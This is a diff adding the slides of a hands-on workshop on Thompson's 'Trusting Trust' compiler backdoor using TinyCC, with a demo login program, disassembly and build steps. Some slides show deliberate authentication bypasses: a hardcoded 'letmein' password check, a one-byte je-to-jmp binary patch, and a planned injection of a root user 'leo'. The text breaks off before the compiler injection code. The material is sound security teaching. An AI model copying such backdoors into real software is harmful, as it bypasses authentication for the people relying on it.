@@ -1,0 +1,2668 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="author" content="Building a self-reproducing compiler backdoor"/>
+<style type="text/css">
+.underline { text-decoration: underline; }
+</style>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css"/>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/white.css" id="theme"/>
+
+<link rel="stylesheet" href="./custom.css"/>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+<section id="sec-title-slide">
+<h1 class="title">Trusting Trust<br>Hands on</h1><h2 class="author">Building a self-reproducing compiler backdoor</h2>
+</section>
+<section>
+<section id="slide-org1b3bb44">
+<h2 id="org1b3bb44">The idea</h2>
+</section>
+<section>
+
+
+<div id="orgf7a9d55" class="figure">
+<p><img src="./img/thompson.jpg" alt="thompson.jpg" width="620px" />
+</p>
+</div>
+
+<p>
+Ken Thompson &amp; Dennis Ritchie
+</p>
+
+</section>
+<section>
+
+<p>
+Ken Thompson contributions:
+</p>
+
+<ul>
+<li><b>Unix</b> (1969), written in PDP-7 assembly</li>
+<li><b>B</b> (1969), which led to <b>C</b> (Ritchie, 1972)</li>
+<li>Unix rewritten in C (1973).</li>
+<li><b>Regex alg</b> (1968), later in <code>ed</code> and <code>grep</code> (1973)</li>
+<li><b>UTF-8</b> (with Pike, 1992)</li>
+<li><b>Plan 9</b> operating system (late 1980s, released 1992)</li>
+<li><b>Go</b> (with Pike &amp; Griesemer, 2009)</li>
+
+</ul>
+
+</section>
+<section>
+
+<p>
+<b>Turing Award</b> (1983) with Ritchie for the work on Unix.
+</p>
+
+
+<div id="orgeae1462" class="figure">
+<p><img src="./img/paper.png" alt="paper.png" width="1000px" />
+</p>
+</div>
+
+</section>
+<section>
+
+<div class="paper-pages">
+  <img src="./img/thompson-page-1.png" alt="Reflections on Trusting Trust, page 1">
+  <img src="./img/thompson-page-2.png" alt="Reflections on Trusting Trust, page 2">
+  <img src="./img/thompson-page-3.png" alt="Reflections on Trusting Trust, page 3">
+</div>
+
+</section>
+<section>
+
+<p>
+Lets consider a simple <code>login.c</code> program.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">main</span>(<span style="color: #6ae4b9;">void</span>) {
+  <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">name</span> = read_username();          <span style="color: #989898;">/* </span><span style="color: #989898;">"login: "</span><span style="color: #989898;">    */</span>
+  <span style="color: #b6a0ff;">struct</span> <span style="color: #6ae4b9;">user</span> *<span style="color: #00d3d0;">u</span> = find_user(name);      <span style="color: #989898;">/* </span><span style="color: #989898;">stored hash</span><span style="color: #989898;">  */</span>
+  <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">pw</span> = getpass(<span style="color: #79a8ff;">"Password: "</span>);
+
+  <span style="color: #989898;">/* </span><span style="color: #989898;">hash the typed password, compare with the stored hash</span><span style="color: #989898;"> */</span>
+  <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">hash</span> = crypt(pw, u-&gt;hash);
+  <span style="color: #b6a0ff;">if</span> (strcmp(hash, u-&gt;hash) != 0) {
+    puts(<span style="color: #79a8ff;">"Login incorrect"</span>);
+    <span style="color: #b6a0ff;">return</span> 1;
+  }
+
+  printf(<span style="color: #79a8ff;">"Welcome %s\n"</span>, u-&gt;name);
+  setgid(u-&gt;gid);                        <span style="color: #989898;">/* </span><span style="color: #989898;">become the user:</span><span style="color: #989898;"> */</span>
+  setuid(u-&gt;uid);                        <span style="color: #989898;">/* </span><span style="color: #989898;">group, then uid</span><span style="color: #989898;">  */</span>
+  execl(<span style="color: #79a8ff;">"/bin/sh"</span>, <span style="color: #79a8ff;">"-sh"</span>, <span style="color: #00bcff;">NULL</span>);         <span style="color: #989898;">/* </span><span style="color: #989898;">give a shell</span><span style="color: #989898;"> */</span>
+}
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+The compiler will generate a bunch of instructions depending on the
+targeted architecture.
+</p>
+
+<div class="code-columns"><div>
+<pre class="example" id="org951f8fc">
+10b0: 55                   push rbp
+10b1: 53                   push rbx
+10b2: 51                   push rcx
+10b3: e8 81 01 00 00       call read_username
+10b8: 48 89 c7             mov rdi,rax
+10bb: e8 7c 01 00 00       call find_user
+10c0: 48 8d 3d 3d 0f 00 00 lea rdi,[rip+0xf3d]
+10c7: 48 89 c5             mov rbp,rax
+10ca: e8 a1 ff ff ff       call getpass@plt
+10cf: 48 8b 75 08          mov rsi,[rbp+0x8]
+10d3: 48 89 c7             mov rdi,rax
+10d6: e8 c5 ff ff ff       call crypt@plt
+10db: 48 8b 75 08          mov rsi,[rbp+0x8]
+10df: 48 89 c7             mov rdi,rax
+10e2: e8 69 ff ff ff       call strcmp@plt
+10e7: 85 c0                test eax,eax
+10e9: 74 13                je 10fe
+10eb: 48 8d 3d 1d 0f 00 00 lea rdi,[rip+0xf1d]
+10f2: bb 01 00 00 00       mov ebx,0x1
+10f7: e8 34 ff ff ff       call puts@plt
+</pre>
+</div><div>
+<pre class="example" id="org6b4f27e">
+10fc: eb 3b                jmp 1139
+10fe: 48 8b 75 00          mov rsi,[rbp+0x0]
+1102: 48 8d 3d 16 0f 00 00 lea rdi,[rip+0xf16]
+1109: 89 c3                mov ebx,eax
+110b: 31 c0                xor eax,eax
+110d: e8 2e ff ff ff       call printf@plt
+1112: 8b 7d 14             mov edi,[rbp+0x14]
+1115: e8 46 ff ff ff       call setgid@plt
+111a: 8b 7d 10             mov edi,[rbp+0x10]
+111d: e8 5e ff ff ff       call setuid@plt
+1122: 31 d2                xor edx,edx
+1124: 48 8d 35 00 0f 00 00 lea rsi,[rip+0xf00]
+112b: 31 c0                xor eax,eax
+112d: 48 8d 3d fb 0e 00 00 lea rdi,[rip+0xefb]
+1134: e8 57 ff ff ff       call execl@plt
+1139: 89 d8                mov eax,ebx
+113b: 5a                   pop rdx
+113c: 5b                   pop rbx
+113d: 5d                   pop rbp
+113e: c3                   ret
+</pre>
+</div></div>
+
+</section>
+<section>
+
+<p>
+The compiler will generate a bunch of instructions depending on the
+targeted architecture.
+</p>
+
+  <div class="code-columns">
+  <pre class="example">10b0: 55                   push rbp
+10b1: 53                   push rbx
+10b2: 51                   push rcx
+10b3: e8 81 01 00 00       call read_username
+10b8: 48 89 c7             mov rdi,rax
+10bb: e8 7c 01 00 00       call find_user
+10c0: 48 8d 3d 3d 0f 00 00 lea rdi,[rip+0xf3d]
+10c7: 48 89 c5             mov rbp,rax
+10ca: e8 a1 ff ff ff       call getpass@plt
+10cf: 48 8b 75 08          mov rsi,[rbp+0x8]
+10d3: 48 89 c7             mov rdi,rax
+<span class="hl">10d6: e8 c5 ff ff ff       call crypt@plt</span>
+10db: 48 8b 75 08          mov rsi,[rbp+0x8]
+10df: 48 89 c7             mov rdi,rax
+<span class="hl">10e2: e8 69 ff ff ff       call strcmp@plt</span>
+<span class="hl">10e7: 85 c0                test eax,eax</span>
+<span class="hl">10e9: 74 13                je 10fe</span>
+10eb: 48 8d 3d 1d 0f 00 00 lea rdi,[rip+0xf1d]
+10f2: bb 01 00 00 00       mov ebx,0x1
+10f7: e8 34 ff ff ff       call puts@plt</pre>
+  <pre class="example">10fc: eb 3b                jmp 1139
+10fe: 48 8b 75 00          mov rsi,[rbp+0x0]
+1102: 48 8d 3d 16 0f 00 00 lea rdi,[rip+0xf16]
+1109: 89 c3                mov ebx,eax
+110b: 31 c0                xor eax,eax
+110d: e8 2e ff ff ff       call printf@plt
+1112: 8b 7d 14             mov edi,[rbp+0x14]
+<span class="hl">1115: e8 46 ff ff ff       call setgid@plt</span>
+111a: 8b 7d 10             mov edi,[rbp+0x10]
+<span class="hl">111d: e8 5e ff ff ff       call setuid@plt</span>
+1122: 31 d2                xor edx,edx
+1124: 48 8d 35 00 0f 00 00 lea rsi,[rip+0xf00]
+112b: 31 c0                xor eax,eax
+112d: 48 8d 3d fb 0e 00 00 lea rdi,[rip+0xefb]
+<span class="hl">1134: e8 57 ff ff ff       call execl@plt</span>
+1139: 89 d8                mov eax,ebx
+113b: 5a                   pop rdx
+113c: 5b                   pop rbx
+113d: 5d                   pop rbp
+113e: c3                   ret</pre>
+  </div>
+
+</section>
+<section>
+
+<p>
+The instructions that matter for authentication
+</p>
+
+  <pre class="example asm-focus">
+<span class="hl">10d6: e8 c5 ff ff ff       call crypt@plt</span>    <span class="note">; hash typed password</span>
+<span class="hl">10e2: e8 69 ff ff ff       call strcmp@plt</span>   <span class="note">; compare with stored hash</span>
+<span class="hl">10e7: 85 c0                test eax,eax</span>      <span class="note">; equal?</span>
+<span class="hl">10e9: 74 13                je 10fe</span>           <span class="note">; yes: skip "Login incorrect"</span>
+<span class="dim">...</span>
+<span class="hl">1115: e8 46 ff ff ff       call setgid@plt</span>   <span class="note">; become the user's group</span>
+<span class="hl">111d: e8 5e ff ff ff       call setuid@plt</span>   <span class="note">; become the user</span>
+<span class="dim">...</span>
+<span class="hl">1134: e8 57 ff ff ff       call execl@plt</span>    <span class="note">; start the shell</span></pre>
+
+</section>
+<section>
+
+<div class="compile-flow"><div>
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #ff7f86;">#include</span> <span style="color: #79a8ff;">&lt;stdio.h&gt;</span>
+
+<span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">main</span>(<span style="color: #6ae4b9;">void</span>) {
+  printf(<span style="color: #79a8ff;">"Hello, world!\n"</span>);
+  <span style="color: #b6a0ff;">return</span> 0;
+}
+</pre>
+</div>
+</div>
+<div class="compile-arrow">
+  <span>compiler</span>
+  <svg viewBox="0 0 120 40" width="120" height="40" aria-hidden="true">
+    <line x1="4" y1="20" x2="100" y2="20" stroke="currentColor" stroke-width="6"/>
+    <polygon points="96,6 118,20 96,34" fill="currentColor"/>
+  </svg>
+</div>
+<div>
+<pre class="example" id="org41fc4d9">
+1040: 50                   push rax
+1041: 48 8d 3d bc 0f 00 00 lea rdi,[rip+0xfbc]
+1048: e8 e3 ff ff ff       call puts@plt
+104d: 31 c0                xor eax,eax
+104f: 5a                   pop rdx
+1050: c3                   ret
+</pre>
+</div></div>
+
+<hr />
+
+<p>
+Two (simple) ways of adding a backdoor
+</p>
+
+<ol>
+<li>Modify the <b>source code</b></li>
+
+<li>Modify the <b>binary</b></li>
+
+</ol>
+
+</section>
+<section>
+
+<p>
+Backdoor 1 - Modify source code
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c">  <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">hash</span> = crypt(pw, u-&gt;hash);
+
+  <span style="color: #989898;">/* </span><span style="color: #989898;">--- backdoor: added by hand ---</span><span style="color: #989898;"> */</span>
+  <span style="color: #b6a0ff;">if</span> (strcmp(pw, <span style="color: #79a8ff;">"letmein"</span>) == 0)
+    <span style="color: #b6a0ff;">goto</span> <span style="color: #00bcff;">ok</span>;                       <span style="color: #989898;">/* </span><span style="color: #989898;">skip the real check</span><span style="color: #989898;"> */</span>
+
+  <span style="color: #b6a0ff;">if</span> (strcmp(hash, u-&gt;hash) != 0) {
+    puts(<span style="color: #79a8ff;">"Login incorrect"</span>);
+    <span style="color: #b6a0ff;">return</span> 1;
+  }
+<span style="color: #00bcff;">ok</span>:
+  printf(<span style="color: #79a8ff;">"Welcome %s\n"</span>, u-&gt;name);
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+Backdoor 2 - Modify the binary
+</p>
+
+  <div class="code-columns">
+  <pre class="example"><span class="dim">; before</span>
+10e2: e8 69 ff ff ff       call strcmp@plt
+10e7: 85 c0                test eax,eax
+<span class="hl">10e9: 74 13                je 10fe</span></pre>
+  <pre class="example"><span class="dim">; after</span>
+10e2: e8 69 ff ff ff       call strcmp@plt
+10e7: 85 c0                test eax,eax
+<span class="hl">10e9: eb 13                jmp 10fe</span></pre>
+  </div>
+
+</section>
+<section>
+
+<p>
+Backdooring <code>login.c</code>? Not ideal.
+</p>
+
+<div class="leftblock" id="org9cbbf80">
+<p>
+<b>Backdoor 1 (source code)</b>
+</p>
+<ul>
+<li>Visible to anyone who reads <code>login.c</code></li>
+<li>Recorded in <code>git</code> history</li>
+
+</ul>
+
+<p>
+<b>Backdoor 2 (binary)</b>
+</p>
+<ul>
+<li>Wiped out by the next recompile from source</li>
+
+</ul>
+
+</div>
+
+</section>
+<section>
+
+  <div class="compile-flow">
+    <div class="crossed">
+      <pre class="src src-c">#include &lt;stdio.h&gt;
+
+int main(void) {
+  printf("Hello, world!\n");
+  return 0;
+}</pre>
+      <svg class="redx" viewBox="0 0 100 100" preserveAspectRatio="none">
+        <line x1="6" y1="6" x2="94" y2="94"/>
+        <line x1="94" y1="6" x2="6" y2="94"/>
+      </svg>
+    </div>
+    <div class="compile-arrow big">
+      <span>Compiler</span>
+      <svg viewBox="0 0 120 40" width="120" height="40" aria-hidden="true">
+        <line x1="4" y1="20" x2="100" y2="20" stroke="currentColor" stroke-width="6"/>
+        <polygon points="96,6 118,20 96,34" fill="currentColor"/>
+      </svg>
+    </div>
+    <div class="crossed">
+      <pre class="example">1040: 50                   push rax
+1041: 48 8d 3d bc 0f 00 00 lea rdi,[rip+0xfbc]
+1048: e8 e3 ff ff ff       call puts@plt
+104d: 31 c0                xor eax,eax
+104f: 5a                   pop rdx
+1050: c3                   ret</pre>
+      <svg class="redx" viewBox="0 0 100 100" preserveAspectRatio="none">
+        <line x1="6" y1="6" x2="94" y2="94"/>
+        <line x1="94" y1="6" x2="6" y2="94"/>
+      </svg>
+    </div>
+  </div>
+
+</section>
+<section>
+
+<div class="meme">
+  <p class="setup">No one (in 1984):</p>
+  <div class="meme-line">
+    <img src="./img/thompson-face.jpg" alt="Ken Thompson">
+    <p>What if we backdoor the <code>compiler</code>?</p>
+  </div>
+</div>
+
+</section>
+<section>
+
+<p>
+Thompson's recipe is simple and beautiful.
+</p>
+
+<div class="leftblock" id="org28c95c6">
+<ol>
+<li>Recognize <code>login.c</code> during compilation and inject the <b>backdoor</b>.</li>
+
+<li>Recognize the compiler own source during compilation and inject the
+<b>self-propagating backdoor</b>.</li>
+
+</ol>
+
+</div>
+
+</section>
+<section>
+
+<div class="bigline" id="org0ca0c0d">
+<p>
+Let's see it in practice.
+</p>
+
+</div>
+
+</section>
+<section>
+
+<div class="realworld">
+  <div class="copy">
+    <p>Btw, this stuff actually happens in the real world:</p>
+    <ul>
+      <li><b>XcodeGhost</b>, 2015</li>
+      <li><b>SolarWinds</b>, 2020</li>
+      <li><b>XZ Utils</b>, 2024</li>
+    </ul>
+  </div>
+  <figure>
+    <img src="./img/dune-worm.png" alt="A sandworm from Dune, fan art by Astronimation">
+    <figcaption>Astronimation, CC BY 3.0</figcaption>
+  </figure>
+</div>
+
+</section>
+<section>
+
+
+<div id="org24cb7f4" class="figure">
+<p><img src="./img/solarwinds-romhack.png" alt="solarwinds-romhack.png" width="800px" />
+</p>
+</div>
+
+<p>
+<a href="https://www.youtube.com/watch?v=yNGt_xxbUGcb">https://www.youtube.com/watch?v=yNGt_xxbUGcb</a>
+</p>
+</section>
+<section id="slide-org1e1b092">
+<h3 id="org1e1b092"></h3>
+<div class="whoami">
+  <p class="name">Leonardo Tamiano ~ leonardotamiano.xyz </p>
+  <p class="mission">I want to improve the quality of Computer Science education.</p>
+  <ul>
+    <li>Freelance Cybersecurity Trainer</li>
+    <li>Computer Science Teacher</li>
+    <li>Penetration Tester</li>
+  </ul>
+</div>
+
+</section>
+<section>
+
+<p>
+How should we teach students in Computer Science?
+</p>
+
+<ul>
+<li><a href="https://esadecimale.it">https://esadecimale.it</a></li>
+<li><a href="https://hexdump.sh">https://hexdump.sh</a></li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-org6ccc924">
+<h2 id="org6ccc924">Towards the cutest program</h2>
+</section>
+<section>
+
+
+<div id="org2c986ca" class="figure">
+<p><img src="./img/github-1.png" alt="github-1.png" width="1000px" />
+</p>
+</div>
+
+<p>
+<a href="https://github.com/Esadecimale/thompson-backdoor">https://github.com/Esadecimale/thompson-backdoor</a>
+</p>
+
+</section>
+<section>
+
+<p>
+<a href="https://github.com/Esadecimale/thompson-backdoor">https://github.com/Esadecimale/thompson-backdoor</a>
+</p>
+</section>
+<section id="slide-org7bb6196">
+<h3 id="org7bb6196"><code>login.c</code></h3>
+</section>
+<section>
+
+<p>
+Simple <code>login</code> program inspired by the one in Unix V7.
+</p>
+
+<div class="small leftblock" id="orgf3249bc">
+<ul>
+<li>Read a <b>username</b></li>
+<li>Look it up in a small user table</li>
+<li>Prompt for a <b>password</b></li>
+<li><code>crypt()</code> the password and compare with the stored hash</li>
+<li>On match print a welcome and drop into a <code>/bin/sh</code></li>
+
+</ul>
+
+</div>
+
+</section>
+<section>
+
+<p>
+A fixed table of users stands in for <code>/etc/passwd</code>.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b6a0ff;">static</span> <span style="color: #b6a0ff;">const</span> <span style="color: #b6a0ff;">struct</span> <span style="color: #6ae4b9;">user</span> <span style="color: #00d3d0;">USERS</span>[] = {
+  { <span style="color: #79a8ff;">"alice"</span>, <span style="color: #79a8ff;">"aacoGZy0DVVSw"</span> }, <span style="color: #989898;">/* </span><span style="color: #989898;">demo</span><span style="color: #989898;">   */</span>
+  { <span style="color: #79a8ff;">"bob"</span>,   <span style="color: #79a8ff;">"bbXi4Hst6ytRc"</span> }, <span style="color: #989898;">/* </span><span style="color: #989898;">secret</span><span style="color: #989898;"> */</span>
+  { <span style="color: #79a8ff;">"root"</span>,  <span style="color: #79a8ff;">"aacoGZy0DVVSw"</span> }, <span style="color: #989898;">/* </span><span style="color: #989898;">demo</span><span style="color: #989898;">   */</span>
+  { <span style="color: #00bcff;">NULL</span>, <span style="color: #00bcff;">NULL</span> }
+};
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+The core logic is the same as the one in Unix V7
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c">  u    = find_user(name);
+  pw   = read_password();
+
+  <span style="color: #989898;">/* </span><span style="color: #989898;">hash the typed password, compare with stored hash</span><span style="color: #989898;"> */</span>
+  namep = crypt(pw, u ? u-&gt;hash : <span style="color: #79a8ff;">"xx"</span>);
+  <span style="color: #b6a0ff;">if</span> (<span style="color: #ff5f59; font-weight: bold;">!</span>u || <span style="color: #ff5f59; font-weight: bold;">!</span>namep || strcmp(namep, u-&gt;hash) != 0) {
+    puts(<span style="color: #79a8ff;">"Login incorrect"</span>);
+    <span style="color: #b6a0ff;">return</span> 1;
+  }
+
+  printf(<span style="color: #79a8ff;">"Welcome %s\n"</span>, u-&gt;name);   <span style="color: #989898;">/* </span><span style="color: #989898;">authenticated</span><span style="color: #989898;"> */</span>
+  execl(<span style="color: #79a8ff;">"/bin/sh"</span>, <span style="color: #79a8ff;">"-sh"</span>, <span style="color: #00bcff;">NULL</span>);     <span style="color: #989898;">/* </span><span style="color: #989898;">give a shell</span><span style="color: #989898;">  */</span>
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+The full source of <code>login.c</code>
+</p>
+
+   <div class="code-pages">
+    <div class="code-page"><span class="cap">lines 1&ndash;37 &middot; header, users</span><pre class="src src-c">/*
+ * Tiny demo login for the RomHack Thompson workshop.
+ *
+ * No PAM. Auth is in this file, same idea as Research Unix V7:
+ *   hash = crypt(getpass(&quot;Password:&quot;), salt);
+ *   compare to the stored hash.
+ *
+ * Not a system /bin/login. Demo users only (see USERS below).
+ * Historical original: login.v7.c (Bell Labs Research Unix Seventh Edition).
+ *
+ * Clean source on purpose: the Thompson backdoor is planted by a
+ * compromised compiler at compile time, not written here.
+ */
+#define _DEFAULT_SOURCE
+#define _XOPEN_SOURCE 700
+
+#include &lt;crypt.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+struct user {
+    const char *name;
+    const char *hash; /* crypt(3) hash; password is the comment below */
+};
+
+/*
+ * password &quot;demo&quot;   -&gt; DES crypt, salt &quot;aa&quot;
+ * password &quot;secret&quot; -&gt; DES crypt, salt &quot;bb&quot;
+ */
+static const struct user USERS[] = {
+    { &quot;alice&quot;, &quot;aacoGZy0DVVSw&quot; }, /* demo */
+    { &quot;bob&quot;,   &quot;bbXi4Hst6ytRc&quot; }, /* secret */
+    { &quot;root&quot;,  &quot;aacoGZy0DVVSw&quot; }, /* demo */
+    { NULL, NULL }
+};</pre></div>
+    <div class="code-page"><span class="cap">lines 39&ndash;60 &middot; helpers</span><pre class="src src-c">static const struct user *find_user(const char *name)
+{
+    const struct user *u;
+    for (u = USERS; u-&gt;name; u++)
+        if (strcmp(u-&gt;name, name) == 0)
+            return u;
+    return NULL;
+}
+
+static char *read_password(void)
+{
+    if (isatty(STDIN_FILENO))
+        return getpass(&quot;Password: &quot;);
+
+    static char buf[128];
+    fputs(&quot;Password: &quot;, stdout);
+    fflush(stdout);
+    if (!fgets(buf, sizeof buf, stdin))
+        return NULL;
+    buf[strcspn(buf, &quot;\n&quot;)] = &#x27;\0&#x27;;
+    return buf;
+}</pre></div>
+   </div>
+
+</section>
+<section>
+
+<p>
+The full source of <code>login.c</code>
+</p>
+
+   <div class="code-pages">
+    <div class="code-page"><span class="cap">lines 62&ndash;83 &middot; main: read input</span><pre class="src src-c">int main(int argc, char **argv)
+{
+    char name[64];
+    char *pw, *namep;
+    const struct user *u;
+
+    if (argc &gt; 1) {
+        snprintf(name, sizeof name, &quot;%s&quot;, argv[1]);
+    } else {
+        fputs(&quot;login: &quot;, stdout);
+        fflush(stdout);
+        if (!fgets(name, sizeof name, stdin))
+            return 0;
+        name[strcspn(name, &quot;\n&quot;)] = &#x27;\0&#x27;;
+    }
+
+    u = find_user(name);
+    /* Always prompt, even for unknown users (same idea as V7 + nouser). */
+    pw = read_password();
+    if (!pw)
+        return 1;</pre></div>
+    <div class="code-page"><span class="cap">lines 84&ndash;107 &middot; main: authenticate</span><pre class="src src-c">    /* The V7 line Thompson matched looked like: namep = crypt(pwbuf, …); */
+    namep = crypt(pw, u ? u-&gt;hash : &quot;xx&quot;);
+    if (isatty(STDIN_FILENO))
+        explicit_bzero(pw, strlen(pw));
+
+    if (!u || !namep || strcmp(namep, u-&gt;hash) != 0) {
+        puts(&quot;Login incorrect&quot;);
+        return 1;
+    }
+
+    printf(&quot;Welcome %s\n&quot;, u-&gt;name);
+    /* Demo stand-in for setuid + shell. */
+    if (strcmp(u-&gt;name, &quot;root&quot;) == 0)
+        puts(&quot;you have root privileges&quot;);
+    fflush(stdout);
+
+    /* Interactive: drop into a shell. Scripted: just report success. */
+    if (isatty(STDIN_FILENO)) {
+        execl(&quot;/bin/sh&quot;, &quot;-sh&quot;, (char *)NULL);
+        perror(&quot;execl&quot;);
+        return 1;
+    }
+    return 0;
+}</pre></div>
+   </div>
+
+</section>
+<section>
+
+<p>
+Video of me explaining the original UNIX-v6 code.
+</p>
+
+
+<div id="org115e224" class="figure">
+<p><img src="./img/login.png" alt="login.png" width="800px" />
+</p>
+</div>
+
+<p>
+<a href="https://www.youtube.com/watch?v=dPmVsYLlbic">https://www.youtube.com/watch?v=dPmVsYLlbic</a>
+</p>
+
+</section>
+<section>
+
+<p>
+More <b>UNIX</b> please in the university world!
+</p>
+
+
+<div id="org978c8f8" class="figure">
+<p><img src="./img/unix-v6.png" alt="unix-v6.png" width="800px" />
+</p>
+</div>
+
+<p>
+<a href="https://www.retro11.de/ouxr/u6ed/">https://www.retro11.de/ouxr/u6ed/</a>
+</p>
+</section>
+<section id="slide-org3bb5cba">
+<h3 id="org3bb5cba"><code>tinyCC</code></h3>
+</section>
+<section>
+
+<p>
+We will work on <b>TinyCC</b> (<code>tcc</code>).
+</p>
+
+
+<div id="orge65281d" class="figure">
+<p><img src="./img/tinycc.png" alt="tinycc.png" width="600px" />
+</p>
+</div>
+
+<p>
+Fabrice Bellard's tiny C compiler.
+</p>
+
+</section>
+<section>
+
+<p>
+<span class="big-note">tiny ~ 30k lines of C</span>
+</p>
+
+
+<div id="orgb206b87" class="figure">
+<p><img src="./img/tinycc-languages.svg" alt="tinycc-languages.svg" class="org-svg" width="600px" />
+</p>
+</div>
+
+</section>
+<section>
+
+<p>
+Let's build <code>tcc</code> from source
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">git clone https://repo.or.cz/tinycc.git
+<span style="color: #f78fe7;">cd</span> tinycc
+./configure
+make -j$(<span style="color: #f78fe7;">nproc</span>)
+./tcc -v
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+tcc is a <b>one-pass compiler</b>
+</p>
+
+
+<div id="orgef68bf8" class="figure">
+<p><img src="./img/tinycc-pipeline.svg" alt="tinycc-pipeline.svg" class="org-svg" width="1000px" />
+</p>
+</div>
+
+</section>
+<section>
+
+<p>
+Compile <code>login.c</code> with the freshly built <code>tcc</code>.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">tcc -B../tinycc -I../tinycc/include <span style="color: #79a8ff;">\</span>
+    -o login login.c -lcrypt
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+Running <code>login</code>
+</p>
+
+   <div class="term-window">
+     <div class="term-bar"><span></span><span></span><span></span></div>
+     <pre class="term">
+<span class="c">$</span> ./login
+login: <span class="in">alice</span>
+Password: <span class="dim">(demo)</span>
+<span class="ok">Welcome alice</span>          <span class="cmt"># exit 0</span>
+
+<span class="c">$</span> ./login
+login: <span class="in">alice</span>
+Password: <span class="dim">(wrong)</span>
+<span class="bad">Login incorrect</span>       <span class="cmt"># exit 1</span>
+
+<span class="c">$</span> ./login <span class="in">root</span>
+Password: <span class="dim">(demo)</span>
+<span class="ok">Welcome root</span>
+<span class="ok">you have root privileges</span></pre>
+   </div>
+
+</section>
+<section>
+
+<p>
+<code>tcc</code> can compile <code>tcc.c</code> to produce <code>tcc</code>
+</p>
+
+
+<div id="orgbec9d99" class="figure">
+<p><img src="./img/escher.png" alt="escher.png" width="600px" />
+</p>
+</div>
+
+</section>
+<section>
+
+<p>
+A compiler that builds itself is known as <b>self-hosting</b>.   
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">tcc tcc.c -o tcc2 -lm -ldl -lpthread
+./tcc2 tcc.c -o tcc3 -lm -ldl -lpthread
+cmp tcc2 tcc3
+</pre>
+</div>
+
+<p>
+The compiler reproduces itself exactly, byte per byte.
+</p>
+
+</section>
+<section>
+
+<p>
+A compiler that compiles itself can be taught to recognise <b>its own
+source</b>.
+</p>
+
+
+<div id="org3b14fc4" class="figure">
+<p><img src="./img/spiderman.png" alt="spiderman.png" width="600px" />
+</p>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orgd7a353a">
+<h2 id="orgd7a353a">Step 1 · Code injection</h2>
+</section>
+<section>
+
+<p>
+Let's modify the <code>tcc</code> source code to inject a malicious backdoor when
+the <code>login.c</code> program is compiled.
+</p>
+
+<p>
+The backdoor will introduce a magic user called <code>leo</code> with root
+privileges.
+</p>
+
+</section>
+<section>
+
+<p>
+Where is the file read from disk into RAM?
+</p>
+
+
+<div id="org2007ff7" class="figure">
+<p><img src="./img/disk-to-ram-sketch.svg" alt="disk-to-ram-sketch.svg" class="org-svg" width="1000px" />
+</p>
+</div>
+
+</section>
+<section>
+
+<p>
+Where is the file read from disk into RAM?  
+</p>
+
+<p>
+<code>tcc_add_file_internal()</code>, in <code>libtcc.c</code>
+</p>
+
+</section>
+<section>
+
+<p>
+How do we get there? 
+</p>
+
+<div class="callpath">
+  <div class="cp"><span class="fn">main()</span><span class="file">tcc.c</span><span class="note">one compile per input file</span></div>
+  <span class="cp-arr">&darr;</span>
+  <div class="cp"><span class="fn">tcc_add_file()</span><span class="file">libtcc.c</span><span class="note">public entry point</span></div>
+  <span class="cp-arr">&darr;</span>
+  <div class="cp hot"><span class="fn">tcc_add_file_internal()</span><span class="file">libtcc.c</span><span class="note">open + classify the file</span></div>
+  <span class="cp-arr">&darr;</span>
+  <div class="cp"><span class="fn">tcc_compile()</span><span class="file">libtcc.c</span><span class="note">parse &amp; emit code</span></div>
+</div>
+
+</section>
+<section>
+
+<div class="org-src-container">
+
+<pre class="dense">ST_FUNC <span style="color: #6ae4b9;">int</span> <span style="color: #feacd0;">tcc_add_file_internal</span>(<span style="color: #6ae4b9;">TCCState</span> *<span style="color: #00d3d0;">s1</span>, <span style="color: #b6a0ff;">const</span> <span style="color: #6ae4b9;">char</span> *<span style="color: #00d3d0;">filename</span>, <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">flags</span>)
+{
+    <span style="color: #6ae4b9;">int</span> <span style="color: #00d3d0;">fd</span>;
+
+    <span style="color: #b6a0ff;">if</span> (0 == (flags &amp; AFF_TYPE_MASK))
+        flags |= guess_filetype(filename);
+
+    <span style="color: #989898;">/* </span><span style="color: #989898;">ignore binary files with -E</span><span style="color: #989898;"> */</span>
+    <span style="color: #b6a0ff;">if</span> (s1-&gt;output_type == TCC_OUTPUT_PREPROCESS
+        &amp;&amp; (flags &amp; AFF_TYPE_BIN))
+        <span style="color: #b6a0ff;">return</span> 0;
+
+    fd = _tcc_open(s1, filename);                      <span style="color: #989898;">/* </span><span style="color: #989898;">open the file</span><span style="color: #989898;"> */</span>
+    <span style="color: #b6a0ff;">if</span> (fd &lt; 0) {
+        <span style="color: #b6a0ff;">if</span> (flags &amp; AFF_PRINT_ERROR)
